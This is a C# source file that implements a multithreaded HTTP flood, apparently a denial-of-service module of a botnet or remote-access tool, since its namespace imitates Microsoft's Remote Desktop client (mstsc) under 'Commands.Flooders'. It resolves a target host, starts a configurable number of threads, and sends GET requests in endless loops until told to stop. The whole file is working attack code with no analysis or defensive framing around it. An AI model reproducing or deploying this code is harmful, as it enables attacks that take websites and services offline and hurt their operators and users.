using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace mstsc.Aries.Commands.Flooders
{
    sealed class HTTP
    {
        private static ThreadStart[] tFloodingJob;
        private static Thread[] tFloodingThread;
        public static string sFHost;
        public static int Port;
        public static IPAddress IPEo;
        private static HTTPRequest[] hRequestClass;
        public static int iThreads;

        private static bool killThread;

        public static void StartHTTPFlood()
        {
            killThread = false;
            try
            {
                IPEo = Dns.GetHostEntry(new Uri(sFHost).Host).AddressList[0];
            }
            catch
            {
                IPEo = IPAddress.Parse(sFHost);
            }

            tFloodingThread = new Thread[iThreads];
            tFloodingJob = new ThreadStart[iThreads];
            hRequestClass = new HTTPRequest[iThreads];
            
            for (int i = 0; i < iThreads; i++)
            {
                hRequestClass[i] = new HTTPRequest(IPEo, Port);
                tFloodingJob[i] = new ThreadStart(hRequestClass[i].Send);
                tFloodingThread[i] = new Thread(tFloodingJob[i]);
                tFloodingThread[i].Start();
            }

        }

        public static void StopHTTPFlood()
        {
            killThread = true; 
            for (int i = 0; i < iThreads; i++)
            {
                try
                {
                    tFloodingThread[i].Join(1000);
                }
                catch { }//try { tFloodingThread[i].Join(); } catch { } }
            }
            Config.Flooding = false;
        }

        private sealed class HTTPRequest
        {
            private IPAddress sFHost;
            private int Port;

            public HTTPRequest(IPAddress tHost, int Port)
            {
                sFHost = tHost;
                this.Port = Port;
            }

            public void Send()
            {
                while (!killThread)
                {
                    try
                    {
                        byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.0{1}{1}{1}", "/", Environment.NewLine));
                        var host = new IPEndPoint(sFHost, Port);
                        {
                            byte[] recvBuf = new byte[64];
                            var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                            socket.Connect(host);
                            socket.Blocking = false;
                            socket.Send(buf, SocketFlags.None);
                            socket.Receive(recvBuf, 64, SocketFlags.None);
                        }
                        if (killThread) { Thread.CurrentThread.Join(1000); }
                    }
                    catch { }// (Exception ex) { System.Windows.Forms.MessageBox.Show(ex.ToString() + "\n\n\n" + ex.Message); }
                }
            }
        }
    }
}
